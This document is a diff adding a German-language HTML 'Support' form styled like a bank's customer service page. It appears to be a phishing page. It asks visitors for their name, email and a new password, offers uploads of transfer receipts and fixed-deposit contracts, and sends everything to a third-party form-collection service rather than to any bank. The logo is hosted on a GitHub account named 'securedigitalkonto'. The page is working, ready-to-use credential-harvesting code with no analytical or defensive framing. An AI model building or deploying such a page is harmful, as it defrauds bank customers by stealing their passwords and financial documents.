@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Support</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Inter', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #ffffff;
+      color: #111;
+    }
+
+    header {
+      text-align: center;
+      padding: 40px 20px 0;
+    }
+    .logo {
+      height: 60px;
+      margin-bottom: 10px;
+    }
+
+    .form-container {
+      max-width: 600px;
+      background-color: #fff;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.06);
+      margin: 30px auto 60px;
+      padding: 40px 30px;
+    }
+
+    h2 {
+      text-align: center;
+      font-size: 24px;
+      font-weight: 600;
+      color: #e53935;
+      margin-bottom: 8px;
+    }
+
+    p.subtitle {
+      text-align: center;
+      font-size: 16px;
+      color: #555;
+      margin-bottom: 30px;
+    }
+
+    label {
+      display: block;
+      font-weight: 600;
+      margin: 15px 0 6px;
+    }
+
+    input, select, textarea {
+      width: 100%;
+      padding: 12px;
+      font-size: 15px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+    }
+
+    textarea {
+      min-height: 65px;
+      resize: vertical;
+    }
+
+    button {
+      margin-top: 30px;
+      width: 100%;
+      padding: 14px;
+      background-color: #e53935;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #d32f2f;
+    }
+
+    .file-upload {
+      display: none;
+    }
+
+    .error-message {
+      color: red;
+      font-size: 14px;
+      margin-top: 5px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img class="logo" src="https://github.com/securedigitalkonto/kundename/blob/main/support.png?raw=true" alt="Logo">
+  </header>
+
+  <div class="form-container">
+    <h2>Wie können wir Ihnen helfen?</h2>
+    <p class="subtitle">Unser Support-Team ist für Sie da.</p><br>
+
+    <form action="https://formcarry.com/s/Jna7Be0vdck" method="POST" enctype="multipart/form-data">
+      <label for="name">Ihr Name</label>
+      <input type="text" id="name" name="Name" required>
+
+      <label for="email">Ihre E-Mail-Adresse</label>
+      <input type="email" id="email" name="Email" required>
+
+      <label for="anliegen">Anliegen</label>
+      <select id="anliegen" name="Anliegen" required onchange="toggleFileUpload(this.value)">
+        <option value="">Anliegen auswählen</option>
+        <option value="Passwort vergessen">Passwort vergessen</option>
+        <option value="Passwort ändern">Passwort ändern</option>
+        <option value="Dispositionsanfrage">Dispositionsanfrage</option>
+        <option value="Technisches Problem">Technisches Problem</option>
+        <option value="Überweisungsquittung">Überweisungsquittung</option>
+        <option value="Festgeldvertrag">Festgeldvertrag</option>
+        <option value="Sonstiges Thema">Sonstiges Thema</option>
+      </select>
+
+      <div id="upload-quittung" class="file-upload">
+        <label for="beleg1">Überweisungsquittung hochladen</label>
+        <input type="file" id="beleg1" name="Überweisungsquittung" accept=".pdf,.jpg,.jpeg,.png" />
+      </div>
+
+      <div id="upload-vertrag" class="file-upload">
+        <label for="beleg2">Festgeldvertrag hochladen</label>
+        <input type="file" id="beleg2" name="Festgeldvertrag" accept=".pdf,.jpg,.jpeg,.png" />
+      </div>
+
+      <div id="passwort-aendern-fields" class="file-upload">
+        <label for="neues-passwort">Gewünschtes Passwort</label>
+        <input type="password" id="neues-passwort" name="Neues Passwort" minlength="6">
+
+        <label for="passwort-bestaetigen">Passwort bestätigen</label>
+        <input type="password" id="passwort-bestaetigen" name="Passwort bestätigen" minlength="6">
+
+        <div id="pw-error" class="error-message">Passwörter stimmen nicht überein.</div>
+      </div>
+
+      <div id="nachricht-container">
+        <label for="nachricht">Nachricht</label>
+        <textarea id="nachricht" name="Nachricht" placeholder="Bitte beschreiben Sie Ihr Anliegen …" required></textarea>
+      </div>
+
+      <button type="submit" id="submit-button">Absenden</button>
+    </form>
+  </div>
+
+<script>
+  function toggleFileUpload(value) {
+    const quittung = document.getElementById('upload-quittung');
+    const vertrag = document.getElementById('upload-vertrag');
+    const passwort = document.getElementById('passwort-aendern-fields');
+    const nachrichtContainer = document.getElementById('nachricht-container');
+    const nachricht = document.getElementById('nachricht');
+
+    quittung.style.display = 'none';
+    vertrag.style.display = 'none';
+    passwort.style.display = 'none';
+    nachrichtContainer.style.display = 'block';
+    nachricht.required = true;
+
+    if (value === 'Überweisungsquittung') {
+      quittung.style.display = 'block';
+    } else if (value === 'Festgeldvertrag') {
+      vertrag.style.display = 'block';
+    } else if (value === 'Passwort ändern') {
+      passwort.style.display = 'block';
+      nachrichtContainer.style.display = 'none';
+      nachricht.required = false;
+    }
+
+    validatePasswords();
+  }
+
+  document.addEventListener('DOMContentLoaded', function () {
+    const pw1 = document.getElementById('neues-passwort');
+    const pw2 = document.getElementById('passwort-bestaetigen');
+    const errorText = document.getElementById('pw-error');
+    const submitBtn = document.getElementById('submit-button');
+    const form = document.querySelector('form');
+
+    window.validatePasswords = function () {
+      const passwortFelder = document.getElementById('passwort-aendern-fields');
+      const sichtbar = window.getComputedStyle(passwortFelder).display !== 'none';
+
+      if (sichtbar && pw1.value && pw2.value && pw1.value !== pw2.value) {
+        errorText.style.display = 'block';
+        submitBtn.disabled = true;
+      } else {
+        errorText.style.display = 'none';
+        submitBtn.disabled = false;
+      }
+    };
+
+    pw1.addEventListener('input', validatePasswords);
+    pw2.addEventListener('input', validatePasswords);
+  });
+</script> 
+</body>
+</html>
